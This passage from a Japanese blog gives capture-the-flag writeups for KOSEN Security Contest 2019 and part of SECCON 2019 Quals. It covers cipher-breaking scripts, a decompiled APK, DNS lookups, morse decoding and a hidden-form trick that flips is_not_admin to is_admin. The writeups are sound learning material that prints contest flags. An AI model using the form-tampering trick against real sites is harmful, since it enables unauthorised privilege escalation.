if(x==y): return counter y+=1 #print(chr(y)) counter+=1 if(y==ord(\u0026#39;z\u0026#39;)+1): y=ord(\u0026#39;a\u0026#39;) given=\u0026#34;UAPCPD{vv_e_cuyo_csylxwyo_upzzlb?}\u0026#34; flag_format=\u0026#34;CTFKIT\u0026#34; for i in range(len(flag_format)): print(dist(given[i],flag_format[i]),end=\u0026#34; \u0026#34;) print()   すると，\n8 19 16 8 19 16 周期的な並びが出てくる．\nつまり，8個ずらす，19個ずらす，16個ずらす\u0026hellip;を繰り替えしているっぽい．\nこれを与えられた文字列すべてにやれば大丈夫そう．\nただし，記号は例外なので除外しておく．\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  def shift(x,y): x=x.lower() ret=ord(x)+y if(ret\u0026gt;ord(\u0026#39;z\u0026#39;)): ret=ord(\u0026#39;a\u0026#39;)+(ret-ord(\u0026#39;z\u0026#39;)-1) return chr(ret) def decrypt(given): counter=0 for i in (range(len(given))): if(ord(given[i])\u0026gt;ord(\u0026#39;a\u0026#39;) and (given[i] != \u0026#39;{\u0026#39; and given[i] != \u0026#39;}\u0026#39; and given[i] != \u0026#39;_\u0026#39; )): if(counter%3==0): print(shift(given[i],8),end=\u0026#34;\u0026#34;) elif(counter%3==1): print(shift(given[i],19),end=\u0026#34;\u0026#34;) elif(counter%3==2): print(shift(given[i],16),end=\u0026#34;\u0026#34;) counter+=1 else: print(given[i],end=\u0026#34;\u0026#34;) given=\u0026#34;UAPCPD{vv_e_cuyo_csylxwyo_upzzlb?}\u0026#34; flag_format=\u0026#34;CTFKIT\u0026#34; print(flag_format,end=\u0026#34;\u0026#34;) decrypt(given[6:]) print()   CTFKIT{do_u_know_vigenere_cipher?} どうやらヴィジュネル暗号というらしい．\n14 お茶をさぐれ 友達から急に解き途中のプログラムが渡されて訳も分からず解いた．\n一応途中からだけど書き残す．\nといっても多分もう終盤．apkのファイルまで抽出できているのでこれを好きな言語で書き直して実行するだけ．\nもらったapk 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369  live:yuhma5 ，12:37 package com.example.ureshino.ctfmondai_android; import android.animation.Animator; import android.animation.AnimatorListenerAdapter; import android.annotation.TargetApi; import android.app.LoaderManager; import android.content.CursorLoader; import android.content.Loader; import android.database.Cursor; import android.net.Uri; import android.os.AsyncTask; import android.os.Build; import android.os.Bundle; import android.provider.ContactsContract; import android.support.annotation.NonNull; import android.support.design.widget.Snackbar; import android.support.v7.app.AppCompatActivity; import android.text.TextUtils; import android.view.KeyEvent; import android.view.View; import android.view.ViewPropertyAnimator; import android.widget.ArrayAdapter; import android.widget.AutoCompleteTextView; import android.widget.Button; import android.widget.EditText; import android.widget.TextView; import java.util.ArrayList; import java.util.List; public class LoginActivity extends AppCompatActivity implements LoaderManager.LoaderCallbacks\u0026lt;Cursor\u0026gt; { private static final String[] DUMMY_CREDENTIALS = { \u0026#34;herfuvab@sr2b3.wc:tenaoyhr\u0026#34; }; private static final int REQUEST_READ_CONTACTS = 0; private UserLoginTask mAuthTask = null; private AutoCompleteTextView mEmailView; private View mLoginFormView; private EditText mPasswordView; private View mProgressView; private boolean LoginTask(String paramString1, String paramString2) { String[] arrayOfString = DUMMY_CREDENTIALS; int i = arrayOfString.length; boolean bool = false; for (byte b = 0; b \u0026lt; i; b++) { String[] arrayOfString1 = nyaho(arrayOfString[b]).split(\u0026#34;:\u0026#34;); if (arrayOfString1[0].equals(paramString1)) bool = arrayOfString1[1].equals(paramString2); } return bool; } private void addEmailsToAutoComplete(List\u0026lt;String\u0026gt; paramList) { ArrayAdapter arrayAdapter = new ArrayAdapter(this, 17367050, paramList); this.mEmailView.setAdapter(arrayAdapter); } private void attemptLogin() { if (this.mAuthTask != null) return; this.mEmailView.setError(null); this.mPasswordView.setError(null); String str1 = this.mEmailView.getText().toString(); String str2 = this.mPasswordView.getText().toString(); byte b2 = 0; StringBuilder stringBuilder = null; byte b1 = b2; AutoCompleteTextView autoCompleteTextView = stringBuilder; if (!TextUtils.isEmpty(str2)) { b1 = b2; autoCompleteTextView = stringBuilder; if (!isPasswordValid(str2)) { this.mPasswordView.setError(getString(2131558449)); autoCompleteTextView = this.mPasswordView; b1 = 1; } } if (TextUtils.isEmpty(str1)) { this.mEmailView.setError(getString(2131558446)); AutoCompleteTextView autoCompleteTextView1 = this.mEmailView; b1 = 1; } else if (!isEmailValid(str1)) { this.mEmailView.setError(getString(2131558448)); autoCompleteTextView = this.mEmailView; b1 = 1; } if (b1 != 0) { autoCompleteTextView.requestFocus(); return; } if (LoginTask(str1, str2)) { TextView textView = (TextView)findViewById(2131230792); textView.setVisibility(0); stringBuilder = new StringBuilder(); stringBuilder.append(f()); stringBuilder.append(l()); stringBuilder.append(o()); stringBuilder.append(g()); stringBuilder.append(g2()); stringBuilder.append(e()); stringBuilder.append(h()); stringBuilder.append(i()); stringBuilder.append(j()); stringBuilder.append(k()); stringBuilder.append(l2()); stringBuilder.append(n()); stringBuilder.append(o2()); String str = stringBuilder.toString(); StringBuilder stringBuilder1 = new StringBuilder(); stringBuilder1.append(\u0026#34;CTFKIT{\u0026#34;); stringBuilder1.append(nyaho(str)); stringBuilder1.append(\u0026#34;}\u0026#34;); textView.setText(stringBuilder1.toString()); return; } this.mEmailView.setError(\u0026#34;Login Failed.... ((((((((((っ･ω･)っ \u0026#34;); ((TextView)findViewById(2131230792)).setVisibility(4); this.mEmailView.requestFocus(); } private boolean isEmailValid(String paramString) { return paramString.contains(\u0026#34;@\u0026#34;); } private boolean isPasswordValid(String paramString) { return (paramString.length() \u0026gt; 4); } private boolean mayRequestContacts() { if (Build.VERSION.SDK_INT \u0026lt; 23) return true; if (checkSelfPermission(\u0026#34;android.permission.READ_CONTACTS\u0026#34;) == 0) return true; if (shouldShowRequestPermissionRationale(\u0026#34;android.permission.READ_CONTACTS\u0026#34;)) { Snackbar.make(this.mEmailView, 2131558459, -2).setAction(17039370, new View.OnClickListener() { @TargetApi(23) public void onClick(View param1View) { LoginActivity.this.requestPermissions(new String[] { \u0026#34;android.permission.READ_CONTACTS\u0026#34; }, 0); } }); return false; } requestPermissions(new String[] { \u0026#34;android.permission.READ_CONTACTS\u0026#34; }, 0); return false; } private void populateAutoComplete() { if (!mayRequestContacts()) return; getLoaderManager().initLoader(0, null, this); } @TargetApi(13) private void showProgress(final boolean show) { int i = Build.VERSION.SDK_INT; int k = 0; int j = 0; if (i \u0026gt;= 13) { float f1; k = getResources().getInteger(17694720); View view2 = this.mLoginFormView; if (paramBoolean) { i = 8; } else { i = 0; } view2.setVisibility(i); ViewPropertyAnimator viewPropertyAnimator2 = this.mLoginFormView.animate().setDuration(k); float f2 = 1.0F; if (paramBoolean) { f1 = 0.0F; } else { f1 = 1.0F; } viewPropertyAnimator2.alpha(f1).setListener(new AnimatorListenerAdapter() { public void onAnimationEnd(Animator param1Animator) { byte b; View view = LoginActivity.this.mLoginFormView; if (show) { b = 8; } else { b = 0; } view.setVisibility(b); } }); View view1 = this.mProgressView; if (paramBoolean) { i = j; } else { i = 8; } view1.setVisibility(i); ViewPropertyAnimator viewPropertyAnimator1 = this.mProgressView.animate().setDuration(k); if (paramBoolean) { f1 = f2; } else { f1 = 0.0F; } viewPropertyAnimator1.alpha(f1).setListener(new AnimatorListenerAdapter() { public void onAnimationEnd(Animator param1Animator) { byte b; View view = LoginActivity.this.mProgressView; if (show) { b = 0; } else { b = 8; } view.setVisibility(b); } }); return; } View view = this.mProgressView; if (paramBoolean) { i = 0; } else { i = 8; } view.setVisibility(i); view = this.mLoginFormView; i = k; if (paramBoolean) i = 8; view.setVisibility(i); } public String e() { return \u0026#34;v\u0026#34;; } public String f() { return \u0026#34;h\u0026#34;; } public String g() { return \u0026#34;f\u0026#34;; } public String g2() { return \u0026#34;u\u0026#34;; } public String h() { return \u0026#34;a\u0026#34;; } public String i() { return \u0026#34;b\u0026#34;; } public String j() { return \u0026#34;_\u0026#34;; } public String k() { return \u0026#34;g\u0026#34;; } public String l() { return \u0026#34;e\u0026#34;; } public String l2() { return \u0026#34;r\u0026#34;; } public String n() { return \u0026#34;n\u0026#34;; } public String nyaho(String paramString) { char[] arrayOfChar = new char[paramString.length()]; byte b; for (b = 0; b \u0026lt; paramString.length(); b++) { char c; char c1 = paramString.charAt(b); if (c1 \u0026gt;= \u0026#39;a\u0026#39; \u0026amp;\u0026amp; c1 \u0026lt;= \u0026#39;m\u0026#39;) { c = (char)(c1 + \u0026#39;\\r\u0026#39;); } else if (c1 \u0026gt;= \u0026#39;A\u0026#39; \u0026amp;\u0026amp; c1 \u0026lt;= \u0026#39;M\u0026#39;) { c = (char)(c1 + \u0026#39;\\r\u0026#39;); } else if (c1 \u0026gt;= \u0026#39;n\u0026#39; \u0026amp;\u0026amp; c1 \u0026lt;= \u0026#39;z\u0026#39;) { c = (char)(c1 - \u0026#39;\\r\u0026#39;); } else { c = c1; if (c1 \u0026gt;= \u0026#39;N\u0026#39;) { c = c1; if (c1 \u0026lt;= \u0026#39;Z\u0026#39;) c = (char)(c1 - \u0026#39;\\r\u0026#39;); } } arrayOfChar[b] = c; } return String.valueOf(arrayOfChar); } public String o() { return \u0026#34;r\u0026#34;; } public String o2() { return \u0026#34;_\u0026#34;; } protected void onCreate(Bundle paramBundle) { super.onCreate(paramBundle); setContentView(2131427356); this.mEmailView = (AutoCompleteTextView)findViewById(2131230778); populateAutoComplete(); this.mPasswordView = (EditText)findViewById(2131230832); this.mPasswordView.setOnEditorActionListener(new TextView.OnEditorActionListener() { public boolean onEditorAction(TextView param1TextView, int param1Int, KeyEvent param1KeyEvent) { if (param1Int == 6 || param1Int == 0) { LoginActivity.this.attemptLogin(); return true; } return false; } }); ((Button)findViewById(2131230780)).setOnClickListener(new View.OnClickListener() { public void onClick(View param1View) { LoginActivity.this.attemptLogin(); } }); this.mLoginFormView = findViewById(2131230812); this.mProgressView = findViewById(2131230813); } public Loader\u0026lt;Cursor\u0026gt; onCreateLoader(int paramInt, Bundle paramBundle) { return new CursorLoader(this, Uri.withAppendedPath(ContactsContract.Profile.CONTENT_URI, \u0026#34;data\u0026#34;), ProfileQuery.PROJECTION, \u0026#34;mimetype = ?\u0026#34;, new String[] { \u0026#34;vnd.android.cursor.item/email_v2\u0026#34; }, \u0026#34;is_primary DESC\u0026#34;); } public void onLoadFinished(Loader\u0026lt;Cursor\u0026gt; paramLoader, Cursor paramCursor) { ArrayList arrayList = new ArrayList(); paramCursor.moveToFirst(); while (!paramCursor.isAfterLast()) { arrayList.add(paramCursor.getString(0)); paramCursor.moveToNext(); } addEmailsToAutoComplete(arrayList); } public void onLoaderReset(Loader\u0026lt;Cursor\u0026gt; paramLoader) {} public void onRequestPermissionsResult(int paramInt, @NonNull String[] paramArrayOfString, @NonNull int[] paramArrayOfInt) { if (paramInt == 0 \u0026amp;\u0026amp; paramArrayOfInt.length == 1 \u0026amp;\u0026amp; paramArrayOfInt[0] == 0) populateAutoComplete(); } private static interface ProfileQuery { public static final int ADDRESS = 0; public static final int IS_PRIMARY = 1; public static final String[] PROJECTION = { \u0026#34;data1\u0026#34;, \u0026#34;is_primary\u0026#34; }; } public class UserLoginTask extends AsyncTask\u0026lt;Void, Void, Boolean\u0026gt; { private final String mEmail; private final String mPassword; UserLoginTask(String param1String1, String param1String2) { this.mEmail = param1String1; this.mPassword = param1String2; } protected Boolean doInBackground(Void... param1VarArgs) { try { Thread.sleep(100L); String[] arrayOfString = DUMMY_CREDENTIALS; int i = arrayOfString.length; for (byte b = 0; b \u0026lt; i; b++) { String[] arrayOfString1 = arrayOfString[b].split(\u0026#34;:\u0026#34;); if (arrayOfString1[0].equals(this.mEmail)) arrayOfString1[1].equals(this.mPassword); } return Boolean.valueOf(true); } catch (InterruptedException param1VarArgs) { return Boolean.valueOf(false); } } protected void onCancelled() { LoginActivity.access$402(LoginActivity.this, null); LoginActivity.this.showProgress(false); } protected void onPostExecute(Boolean param1Boolean) { LoginActivity.access$402(LoginActivity.this, null); LoginActivity.this.showProgress(false); if (param1Boolean.booleanValue()) { LoginActivity.this.finish(); return; } LoginActivity.this.mPasswordView.setError(LoginActivity.this.getString(2131558447)); LoginActivity.this.mPasswordView.requestFocus(); } } }    どう考えてもここが怪しい．\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  stringBuilder = new StringBuilder(); stringBuilder.append(f()); stringBuilder.append(l()); stringBuilder.append(o()); stringBuilder.append(g()); stringBuilder.append(g2()); stringBuilder.append(e()); stringBuilder.append(h()); stringBuilder.append(i()); stringBuilder.append(j()); stringBuilder.append(k()); stringBuilder.append(l2()); stringBuilder.append(n()); stringBuilder.append(o2()); String str = stringBuilder.toString(); StringBuilder stringBuilder1 = new StringBuilder(); stringBuilder1.append(\u0026#34;CTFKIT{\u0026#34;); stringBuilder1.append(nyaho(str)); stringBuilder1.append(\u0026#34;}\u0026#34;);   適当な関数から文字列をもらってそれを結合，それをさらにnyahoという関数にかけてflag化してる．\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  public String e() { return \u0026#34;v\u0026#34;; } public String f() { return \u0026#34;h\u0026#34;; } public String g() { return \u0026#34;f\u0026#34;; } public String g2() { return \u0026#34;u\u0026#34;; } public String h() { return \u0026#34;a\u0026#34;; } public String i() { return \u0026#34;b\u0026#34;; } public String j() { return \u0026#34;_\u0026#34;; } public String k() { return \u0026#34;g\u0026#34;; } public String l() { return \u0026#34;e\u0026#34;; } public String l2() { return \u0026#34;r\u0026#34;; } public String n() { return \u0026#34;n\u0026#34;; } public String nyaho(String paramString) { char[] arrayOfChar = new char[paramString.length()]; byte b; for (b = 0; b \u0026lt; paramString.length(); b++) { char c; char c1 = paramString.charAt(b); if (c1 \u0026gt;= \u0026#39;a\u0026#39; \u0026amp;\u0026amp; c1 \u0026lt;= \u0026#39;m\u0026#39;) { c = (char)(c1 + \u0026#39;\\r\u0026#39;); } else if (c1 \u0026gt;= \u0026#39;A\u0026#39; \u0026amp;\u0026amp; c1 \u0026lt;= \u0026#39;M\u0026#39;) { c = (char)(c1 + \u0026#39;\\r\u0026#39;); } else if (c1 \u0026gt;= \u0026#39;n\u0026#39; \u0026amp;\u0026amp; c1 \u0026lt;= \u0026#39;z\u0026#39;) { c = (char)(c1 - \u0026#39;\\r\u0026#39;); } else { c = c1; if (c1 \u0026gt;= \u0026#39;N\u0026#39;) { c = c1; if (c1 \u0026lt;= \u0026#39;Z\u0026#39;) c = (char)(c1 - \u0026#39;\\r\u0026#39;); } } arrayOfChar[b] = c; } return String.valueOf(arrayOfChar); }   必要な情報はすべてもらったソースコードにあるのでpythonに書き換えて復号していく．\nまず，nyahoに与えられる文字列strだが，これは気合で集めた．（は？\nあとはnyahoを以下のスクリプトに書き直せば完成．\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  def decrypt(given): counter=0 for i in (range(len(given))): c=ord(given[i]) if(c \u0026gt;= ord(\u0026#39;a\u0026#39;) and c \u0026lt;= ord(\u0026#39;m\u0026#39;)): print(chr(c+ord(\u0026#39;\\r\u0026#39;)),end=\u0026#34;\u0026#34;) elif(c \u0026gt;= ord(\u0026#39;A\u0026#39;) and c \u0026lt;= ord(\u0026#39;M\u0026#39;)): print(chr(c+ord(\u0026#39;\\r\u0026#39;)),end=\u0026#34;\u0026#34;) elif(c \u0026gt;= ord(\u0026#39;n\u0026#39;) and c \u0026lt;= ord(\u0026#39;z\u0026#39;)): print(chr(c-ord(\u0026#39;\\r\u0026#39;)),end=\u0026#34;\u0026#34;) else: if(c\u0026gt;=ord(\u0026#39;N\u0026#39;)): if(c\u0026lt;=ord(\u0026#39;Z\u0026#39;)): print(chr(c-ord(\u0026#39;\\r\u0026#39;)),end=\u0026#34;\u0026#34;) else: print(chr(c),end=\u0026#34;\u0026#34;) else: print(chr(c),end=\u0026#34;\u0026#34;) given=\u0026#34;herfuvab_grn_\u0026#34; print(\u0026#34;CTFKIT{\u0026#34;,end=\u0026#34;\u0026#34;) decrypt(given) print(\u0026#34;}\u0026#34;)   CTFKIT{ureshino_tea_} 13 名前を解決したい DNSの問題．もうサーバは動いてないので記憶と記録頼り．\nDNSの設定ミスで名前解決ができなくて与えられたリンクにアクセスできない．\n与えられたURL:http://futuregadget-9.tech\nとりあえず，digをうって確認．\n$ dig http://futuregadget-9.tech ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.5-P4-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; http://futuregadget-9.tech ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NXDOMAIN, id: 61541 ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 512 ;; QUESTION SECTION: ;http://futuregadget-9.tech.\tIN\tA ;; AUTHORITY SECTION: tech.\t3600\tIN\tSOA\tns0.centralnic.net. hostmaster.centralnic.net. 262197 900 1800 6048000 3600 ;; Query time: 99 msec ;; SERVER: 192.168.0.1#53(192.168.0.1) ;; WHEN: 月 11月 04 23:06:27 JST 2019 ;; MSG SIZE rcvd: 120 有力な情報は見つからない．\nあれこれオプションを試してみるが芳しくない．\n（後で他の人のwriteupを見たらこれでいけていた．何で？（殺意））\n自分の場合は以下でうまくいった．\ndig http://futuregadget-9.tech -p80 textにIPがあることは分かっていたのになぁ\u0026hellip;\nなんでダメだったんだろう．\nIPが出てくるのでそこにアクセスする．\nCTFKIT{naki_nureshi_megami_no_kikan} 20 偉くなりたい 自分が閃いて解いたのだが，肝心のhtmlが無いので解説できない．\n見つかり次第追記するが，htmlのhidden属性のフォームが隠されていてそのフォームの属性をtextに変えてその欄にデフォルトでかかれているis_not_adminをis_adminに変えて送信するとflagが落ちてくる仕組み．\n自分でもよく閃いたと思う．\n10 ツートントン 割とよくあるモールス問題．\n以下のような画像が与えられる．\n小さいので拡大するとこう．（これがまずかった．）\nどうやらこれがモールスの並びっぽい．\n画像のピクセルを読んでビットに置き換える．\nところが，さっき拡大してしまったのでどこのピクセルの値を取るかで迷ってしまった．\nここでかなり時間を取られた．実は，親切にも最初の画像が1ドット1ピクセルになってた．（友達に言われるまで気づかなかった）\nとりあえず，ビットに起こす．\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  import cv2 img=cv2.imread(\u0026#34;image.png\u0026#34;) h,w,c=img.shape x=45 y=45 print(h,w) for i in range(x): for j in range(y): if(img[i,j][0]): print(\u0026#34;+\u0026#34;,end=\u0026#34;\u0026#34;) else: print(\u0026#34;-\u0026#34;,end=\u0026#34;\u0026#34;) print()   45 45 +-----++++++--++--++--++--++++++--++--++++++- -++--++--++++++++++++++--++--++++++--++--++-- ++++++++++++++-----++-----++++++-----++-----+ +-----++++++--++-----++--++++++--++--++--++++ ++--++++++++++++++-----++--++-----++--++++++- ----++-----++-----++++++-----++--++--++++++-- ++++++--++-----++--++-----++--++-----++++++++ ++++++-----++--++-----++--++++++--++-----++++ ++-----++--++++++++++++++-----++--++-----++-- ---++++++-----++-----++-----++++++--++--++--- --++++++++++++++--++--++-----++--++++++--++-- ++++++-----++--++++++-----++--++--+++++++++++ +++-----++++++--++--++--++--++++++--+++++++++ +++++--++--++-----++--++++++--++-----++--++-- ++++++--++-----++++++-----++-----++--++++++-- ++--++-----++-----++--++--++++++++++++++----- ++++++--++--++--++--++++++--++++++++++++++--+ +--++-----++--++++++--++-----++--++--++++++-- ++-----++++++-----++-----++--++++++++++++++-- ++--++++++--++--++--++++++++++++++-----++--++ -----++--++++++-----++++++--++--++-----++--++ ++++-----++--++-----++++++--++--++++++-----++ ++++-----++--++-----++-----++--++++++-----+++ +++--++--++-----++++++--++--++-----++++++---- -++--++--++--++-----++++++-----++++++-----++- ----++-----++++++-----++--++++++-----++--++-- ++--++-----++++++-----++++++-----++-----++--- --++++++-----++--++++++-----++--++--++--++--- --++++++-----++++++--++--++-----++++++--++--+ +-----++++++-----++--++--++--++-----++++++--- --++++++-----++-----++-----++++++-----++--+++ +++-----++--++-----++-----++--++-----++++++++ ++++++--++--++--++--++++++--++-----++++++--++ --++--++--++++++--++-----++++++-----++-----++ --++--++-----++-----++++++++++++++-----++--++ -----++--++++++--++-----++++++-----++--++++++ ++++++++-----++--++-----++-----++++++-----++- ----++-----++++++--++--++-----++++++++++++++- -++--++-----++--++++++--++--++++++-----++--++ ++++-----++--++--++++++++++++++--++--++++++-- ---++++++--++--++-----++-----++--++--++++++++ +++++++++++++++++++++++++++++++++++++++++++++ +++++++++++++++++++++++++++++++++++++++++++++ +++++++++++++++++++++++++++++++++++++++++++++ +++++++++++++++++++++++++++++++++++++++++++++ これをモールス信号に整形する．\n短音がマイナス2つ，長音がマイナス5つ，単語の区切りがプラス6つなのを考慮して置換する．（よく考えたらプラスとマイナス逆だなぁ\u0026hellip;\n置換したものがこちらになります．\n_ .... .. ... .. ... __ ___ ._. ... . _._. ___ _.. . ._._._ _._. ._ _. _.__ ___ .._ .._. .. _. _.. _ .... . .._. ._.. ._ __. ..__.. _ .... . .._. ._.. ._ __. .. ... _._. _ .._. _._ .. _ _.__. _ .._ .._ _..._ _ ___ _. _..._ _ ___ _. _..._ _ .._ .._ _..._ _ ___ _. _.__._ .... ._ .... ._ __..__ _._. ._ _. _.__ ___ .._ .._. .. _. _.. .. _ ..__.. 後はこれをwebのツールに投げておしまい．\n括弧は問題文の通り置換する．\nCTFKIT{TUU=TON=TON=TUU=TON} 感想 一週間も間が空いてしまったがコマンドの履歴とソルバとかファイルが残っていてぎりぎり書けた．\n難しいだろうけど運営は問題をWriteup用にしばらく残して（切実\n偉くなりたいは頼みのキャッシュにページが無かったので探し中．もし見つかったら追記する．\nこうみると結構解いたなぁと思う．頑張った自分．\nまだまだ実力と経験不足なのでこれからも精進したい．\n追記 書いたデータが知らず知らずのうちに消えてた（全ギレ\n投稿した矢先に編集してすいません．\n睡眠時間を返して．\n","description":"KOSENセキュリティコンテスト2019のWriteup","id":15,"section":"posts","tags":["CTF"],"title":"KOSENセキュリティコンテスト2019 Writeup","uri":"https://takana-norimasa.github.io/blog/posts/kosensec_2019/"},{"content":"Sample images from Pixabay\n","description":"cartoon gallery","id":16,"section":"gallery","tags":null,"title":"Cartoon","uri":"https://takana-norimasa.github.io/blog/gallery/cartoon/"},{"content":"Sample images from Pixabay\n","description":"photo gallery","id":17,"section":"gallery","tags":null,"title":"Photo","uri":"https://takana-norimasa.github.io/blog/gallery/photo/"},{"content":" この記事はSECCON Online 2019 Quals Writeup - Qiitaから移転してきたものです．\n はじめに 予定が合わず友達からポケットWifiを借りて出先から参戦．\nサービス問題除いて一問しか解けませんでした（絶望\n何か去年より難しいと思ったのは僕だけですかね\u0026hellip;?\n一応，闘いの記録ということで\u0026hellip;\nWriteup Welcome いつものIRCトピックを見る奴．\n毎回どうするか一瞬焦る．\nSECCON{Welcome to the SECCON 2019 Online CTF} coffee_break 唯一まともに解けた問題．\n以下のpythonファイルと暗号化された文字列があるから復号してね！\nってやつ．\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  import sys from Crypto.Cipher import AES import base64 def encrypt(key, text): s = \u0026#39;\u0026#39; for i in range(len(text)): s += chr((((ord(text[i]) - 0x20) + (ord(key[i % len(key)]) - 0x20)) % (0x7e - 0x20 + 1)) + 0x20) return s key1 = \u0026#34;SECCON\u0026#34; key2 = \u0026#34;seccon2019\u0026#34; text = sys.argv[1] enc1 = encrypt(key1, text) cipher = AES.new(key2 + chr(0x00) * (16 - (len(key2) % 16)), AES.MODE_ECB) p = 16 - (len(enc1) % 16) enc2 = cipher.encrypt(enc1 + chr(p) * p) print(base64.b64encode(enc2).decode(\u0026#39;ascii\u0026#39;))   暗号化された文．\nFyRyZNBO2MG6ncd3hEkC/yeYKUseI/CxYoZiIeV2fe/Jmtwx+WbWmU1gtMX9m905 フラグをこのpythonスクリプトで暗号化すると以上のような文字列になるらしい．\nならば逆に辿っていけばもとのflagにたどり着けるはず．\nencrypt.pyの大まかな流れを整理してみる．\n1.　key1とtext（これが平文かつflag）をencrypt()関数に与えてenc1を得る．\n2.　key2からcipherをenc1からpを求める．\n3.　cipher.encrypt()にenc1とpを与えてenc2を得る\n4.　enc2をbase64でエンコードしてさらにそれをASCIIでデコードする\n5.　4を出力\nこれを5から1に向かって辿って最終的にtextの値が何なのか分かればflagが分かる．\nとりあえず，任意の文字列をencrypt.pyで暗号化して，暗号化した途中の値と復号化スクリプトの途中の値を突き合わせて解いた．\nこれなら少しずつあってるか確認しながら解ける．\n#Step1 復号するときは暗号化する手順の逆から見ればいいので，最後の出力部であるprintから見る．\n1  print(base64.b64encode(enc2).decode(\u0026#39;ascii\u0026#39;))   出力された暗号文＝enc2をbase64でエンコードしたものをASCIIでデコードしたもの\nということは，逆にすると，\nenc2=出力された暗号文をASCIIでエンコードしたものをbase64でデコードしたものとなる．\nコードにするとこんな感じ．\n1  rev1=base64.b64decode(out.encode(\u0026#39;ascii\u0026#39;))   Step1の結果がrev1に入っている．\nこれは，encrypt.pyのenc2とまったく同じになる．\n#Step2 enc2まで遡れたので，次はenc1まで遡る．\nenc2を求める処理は，\n1 2 3 4 5  key2 = \u0026#34;seccon2019\u0026#34; cipher = AES.new(key2 + chr(0x00) * (16 - (len(key2) % 16)), AES.MODE_ECB) p = 16 - (len(enc1) % 16) enc2 = cipher.encrypt(enc1 + chr(p) * p)   となってる．これを逆算してenc1を求めればよい．\nまず，cipher.encrypt()に関してだが，運良くdecrypt()も存在する．つまり，ここの部分に関してはそのままdectypt()に置き換えればよさそう．\nつぎに括弧の中身であるenc1 + chr(p) * pだが，decrypt()した後ものからchr(p) * pを引けばよさそうだ．\nしかし，もう一度よく見てほしい．\npythonにおいてchr()*nの計算は数値計算ではない．\n実際にencrypt.pyのrev1の値をcipher.decrypt()した値を見ればよく分かるが，\n1  b\u0026#34;\u0026#39;jff~|Ox9\u0026#39;34G9#g52F?489\u0026gt;B%|)173~)%8.\u0026#39;jff~|Q\\x05\\x05\\x05\\x05\\x05\u0026#34;   末尾に不自然な\\x05が複数くっついている．これこそが+ chr(p) * pの正体なのだ．\nつまり，+ chr(p) * pは数値を足していたのでは無く，chr(p)　(今回なら\\x05)という文字列をp回enc1にくっつけていたのである．\nこれより，\n1 2  rev2=cipher.decrypt(rev1) rev3=rev2.decode(\u0026#39;ascii\u0026#39;).replace(\u0026#34;\\x05\u0026#34;,\u0026#34;\u0026#34;)   rev2の行でcipher.decrypt()で復号化を行い，\nrev3の行で末尾の適当な文字列を取り除いてASCIIに復号することでenc1が求まる．\nchr(p)の値（replace()の中身）はrev2の中身から予測すればよい．\nrev3とencrypt.pyのenc1はまったく同じものになる．\n#Step3 enc1が分かったのでそこから平文を逆算する．\nenc1を求める処理は以下の部分．\n1 2 3 4 5 6 7 8  def encrypt(key, text): s = \u0026#39;\u0026#39; for i in range(len(text)): s += chr((((ord(text[i]) - 0x20) + (ord(key[i % len(key)]) - 0x20)) % (0x7e - 0x20 + 1)) + 0x20) return s key1 = \u0026#34;SECCON\u0026#34; enc1 = encrypt(key1, text)   encryptの引数であるtextが平文(=flag)である．ゴールは近い．\ndecryptというencrypt()とは逆の動きをする関数を作ればよい．\nencrypt()の動きは大まかに言って平文の各文字に以下の処理をしているだけである．\n1  s += chr((((ord(text[i]) - 0x20) + (ord(key[i % len(key)]) - 0x20)) % (0x7e - 0x20 + 1)) + 0x20)   これの逆算には随分骨が折れそうだ．\nとりあえず，処理を細分化して順番に並べてみる．\n textのi番目の文字列をord()して数値に戻したものに0x20を足す． key1の {iを1keyの長さで割った余り} 番目の文字をord()で数値に戻したものに0x20を引く． 1と2を足す． 3を(0x7e - 0x20 + 1)で割ったあまりを出す． 4に0X20を足す． これをchr()でASCIIに変換  これを逆からやればいい．\n曲者は4だ．余剰を使ってるので値を一意に定められない．幸い，flagの最初はSECCON{なのでそれを手がかりに総当たりすればいい．\n ord()で文字を数値に変換． 1から0x20を引く． 